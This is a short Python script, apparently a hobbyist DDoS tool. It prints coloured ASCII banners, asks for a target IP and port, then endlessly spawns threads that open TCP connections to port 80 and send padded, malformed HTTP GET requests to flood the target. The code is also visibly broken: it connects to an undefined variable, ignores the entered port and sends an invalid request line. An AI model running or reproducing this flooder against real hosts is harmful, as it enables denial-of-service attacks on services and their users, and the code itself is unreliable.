from colorama import Fore,init
init()
print(Fore.YELLOW+"      DDOS ATATK DDOS")



print(Fore.GREEN+"""

⠀/^^     /^^      /^           /^^   /^^   /^^
/^^     /^^     /^ ^^      /^^   /^^ /^^  /^^
/^^     /^^    /^  /^^    /^^        /^^ /^^
/^^^^^^ /^^   /^^   /^^   /^^        /^ /^
/^^     /^^  /^^^^^^ /^^  /^^        /^^  /^^
/^^     /^^ /^^       /^^  /^^   /^^ /^^   /^^
/^^     /^^/^^         /^^   /^^^^   /^^     /^^

""")
from colorama import Fore,init
init()
print(Fore.BLUE+"   DDOS ATATK DDOS")



print(Fore.RED+"""

⠀⠀⠀⠀⠀_                           _
                                          .-.                        (   )                         (   )
  .--.      .---.      .--.       .-..   ( )   .---.   _ .-.      | | .-.     .---.    .--.     | |   ___
 /    \    / .-, \   /  _  \     /    \  (''")  / .-, \ (   )   \     | |/   \   / .-, \  /    \    | |  (   )
|  .-. ;  () ; |  . .' . ;   ' .-,  ;  | |  () ; |  |  .-. .     |  .-. .  (__) ; | |  .-. ;   | |  ' /
|  |(_)   .'  |  | '   | |   | |  . |  | |    .'  |  | |  | |     | |  | |    .'  | |  |(_)  | |,' /
|  |       / .'| |  _\_.(___)  | |  | |  | |   / .'| |  | |  | |     | |  | |   / .'| | |  |       | .  '.
|  | _  | /  | | (   ). '.    | |  | |  | |  | /  | |  | |  | |     | |  | |  | /  | | |  | _   | | . \
|  '(   ) ; |  ; |  | |  \ |   | |  ' |  | |  ; |  ; |  | |  | |     | |  | |  ; |  ; | |  '(   )  | |   \ \
'  -' |  ' -'  |  ; '._,' '   | -'  '  | |  ' -'  |  | |  | |     | |  | |  ' -'  | '  -' |   | |    \ .
 .,'   ..'_.   '._.'    | \.'  (_) ..'_. (_)(_)   (_)(_) ..'_.  .,'   (_ ) (_)
                                | |                                
                               (___)
""")
from colorama import Fore,init
init()
print(Fore.LIGHTWHITE_EX+"" )
NAME =input('         ›››IP : ' )
print('')
name =input('     ATATK   PORT: ' )
print('')
from colorama import Fore,init
init()
print(Fore.LIGHTRED_EX+"")
from socket import *
import time
import threading
def main():
    for i in range(1, 1000):
        s = socket(AF_INET , SOCK_STREAM)
        s.connect((u , 80))
        pack = b"A"*100
        request = "GET / HTTP 1.1\r\n".encode() + pack
        print("send")
        s.send(request)

while True:
    t = threading.Thread(target=main)
    t.start()
